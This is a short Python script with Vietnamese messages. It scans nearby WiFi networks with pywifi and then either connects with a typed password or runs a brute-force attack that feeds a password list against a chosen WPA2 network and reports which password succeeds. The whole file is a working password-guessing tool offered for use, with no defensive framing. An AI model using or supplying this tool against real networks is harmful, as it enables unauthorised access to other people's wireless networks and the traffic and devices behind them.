import time
import pywifi
from pywifi import const
from tqdm import tqdm

def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)  # Chờ để quét
    scan_results = iface.scan_results()
    networks = []
    for profile in scan_results:
        networks.append({
            'SSID': profile.ssid,
            'Signal': profile.signal,
            'Encryption': profile.akm
        })
    return networks

def connect_wifi(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.key = password
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)
    time.sleep(10)
    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def brute_force_connect(ssid, password_file):
    with open(password_file, 'r') as file:
        for line in tqdm(file, desc="Brute Forcing"):
            password = line.strip()
            if connect_wifi(ssid, password):
                print(f"Kết nối thành công đến {ssid} với password: {password}")
                return True
            else:
                print(f"Kết nối thất bại đến {ssid} với password: {password}")
    return False

def main():
    # Quét các mạng WiFi
    print("Đang tìm kiếm Wifi xung quanh...")
    networks = scan_wifi()
    for index, network in enumerate(networks):
        print(f"{index}. SSID: {network['SSID']}, Signal: {network['Signal']}, Encryption: {network['Encryption']}")
    
    # Chọn mạng WiFi để kết nối
    choice = int(input("Enter the number of the WiFi network to connect: "))
    ssid = networks[choice]['SSID']
    
    # Chọn phương pháp kết nối
    attack_mode = input("Bạn có muốn chọn (1) nhập mật khẩu thủ công hay (2) Brute Force với tệp mật khẩu không? Nhập 1 hoặc 2: ")
    if attack_mode == '1':
        password = input("Enter the WiFi password: ")
        if connect_wifi(ssid, password):
            print(f"Kết nối đến {ssid} thành công!")
        else:
            print(f"Kết nối thất bại đến {ssid}.")
    elif attack_mode == '2':
        password_file = input("Enter the path to the password file: ")
        if brute_force_connect(ssid, password_file):
            print(f"Brute Force thành công đến {ssid}.")
        else:
            print(f"Brute Force thất bại đến {ssid}.")
    else:
        print("Invalid choice.")
if __name__ == "__main__":
    main()
